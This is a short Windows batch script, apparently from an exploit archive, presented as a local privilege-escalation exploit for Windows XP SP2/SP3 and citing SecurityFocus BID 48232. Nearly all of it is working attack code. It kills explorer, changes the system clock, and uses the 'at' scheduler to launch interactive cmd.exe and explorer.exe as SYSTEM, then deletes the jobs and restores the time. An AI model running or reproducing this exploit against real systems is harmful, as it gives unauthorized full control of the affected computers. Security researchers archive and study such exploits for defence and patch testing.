@echo off
REM
REM source: http://www.securityfocus.com/bid/48232/info
REM
REM Microsoft Windows is prone to a local privilege-escalation vulnerability.
REM
REM A local attacker can exploit this issue to execute arbitrary code with SYSTEM-level privileges.
REM Successful exploits will result in the complete compromise of affected computers. 
REM Failed exploit attempts may cause a denial-of-service condition. 
REM
 
echo [+] Microsoft WinXP sp2/sp3 local system privilege escalation exploit
start time /T > time.txt
tskill explorer
time 13:36:59 > nul
at 13:37 /interactive cmd.exe
at 13:37 /interactive explorer.exe
at 13:37 /interactive at /del /y
cls
at 13:37 /interactive cmd.exe
at 13:37 /interactive explorer.exe
at 13:37 /interactive at /del /y
cls
at 13:37 /interactive cmd.exe
at 13:37 /interactive explorer.exe
at 13:37 /interactive at /del /y
cls
at 13:37 /interactive cmd.exe
at 13:37 /interactive explorer.exe
at 13:37 /interactive at /del /y
 
echo [*] Backup time
time < time.txt
